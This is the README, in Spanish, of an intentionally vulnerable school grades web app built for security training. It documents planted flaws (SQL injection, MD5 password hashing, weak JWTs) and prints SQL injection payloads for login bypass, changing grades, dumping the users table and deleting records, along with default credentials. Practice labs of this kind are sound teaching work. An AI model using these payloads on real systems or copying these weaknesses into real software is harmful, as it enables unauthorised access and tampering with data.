# Sistema Educativo Vulnerable

Este es un sistema educativo intencionalmente vulnerable diseñado para fines educativos y de práctica de seguridad. El sistema incluye varias vulnerabilidades comunes que pueden ser explotadas para aprender sobre seguridad web.

## Características del Sistema

- Sistema de autenticación con diferentes roles (admin, monitor, estudiante, auditor)
- Gestión de notas de estudiantes
- Sistema de auditoría
- Sistema de logs
- Interfaz web moderna con Bootstrap

## Vulnerabilidades Intencionales

### 1. SQL Injection en Login
El sistema utiliza consultas SQL sin parametrizar, permitiendo inyección SQL en el login:
```sql
' OR '1'='1
```

### 2. SQL Injection en Formulario de Auditoría
El endpoint `/audit` es vulnerable a SQL injection y permite ejecutar múltiples statements. Ejemplo:
```sql
'); UPDATE grades SET grade = 10 WHERE student = 'Juan'; --
```

### 3. Almacenamiento Inseguro de Contraseñas
- Uso de MD5 con salt estático
- Las contraseñas se almacenan con un hash débil
- El salt es predecible y estático

### 4. Tokens JWT Inseguros
- No hay expiración de tokens
- Algoritmo de firma débil
- Secret key predecible

### 5. Logging Inseguro
- Almacenamiento de logs en memoria
- Registro de información sensible
- No hay rotación de logs

## Cómo Ejecutar

1. Instalar dependencias:
```bash
pip install -r requirements.txt
```

2. Ejecutar la aplicación:
```bash
python app.py
```

3. Acceder a http://localhost:5001

## Credenciales de Prueba

- Admin: admin/admin
- Monitor: monitor/password
- Estudiante: Juan/password
- Auditor: auditor1/password

## Ejemplos de Explotación

### SQL Injection en Auditoría
1. Iniciar sesión como auditor1/password
2. En el formulario de auditoría, usar el payload:
```sql
'); UPDATE grades SET grade = 10 WHERE student = 'Juan'; --
```
3. Esto modificará todas las notas de Juan a 10

### Ver Todas las Notas
```sql
'); SELECT * FROM grades; --
```

### Ver Todos los Usuarios
```sql
'); SELECT * FROM users; --
```

### Modificar Notas de Otros Estudiantes
```sql
'); UPDATE grades SET grade = 10 WHERE student = 'Juan'; --
```

### Eliminar Todos los Reportes
```sql
'); DELETE FROM audit_reports; --
```

## Estructura de la Base de Datos

### Tabla users
- username (TEXT)
- password_hash (TEXT)
- role (TEXT)

### Tabla grades
- id (INTEGER)
- student (TEXT)
- subject (TEXT)
- grade (INTEGER)

### Tabla audit_reports
- id (INTEGER)
- auditor (TEXT)
- report (TEXT)
- timestamp (DATETIME)

## Notas de Seguridad

⚠️ **ADVERTENCIA**: Este sistema es intencionalmente vulnerable y NO debe ser utilizado en un entorno de producción. Está diseñado únicamente para fines educativos y de práctica de seguridad.

## Mejores Prácticas que NO se Implementan

1. Uso de consultas parametrizadas
2. Almacenamiento seguro de contraseñas (bcrypt, Argon2)
3. Tokens JWT seguros con expiración
4. Logging seguro
5. Validación de entrada
6. Protección contra CSRF
7. Headers de seguridad
8. Rate limiting
9. Sanitización de datos
10. Control de acceso basado en roles (RBAC) seguro 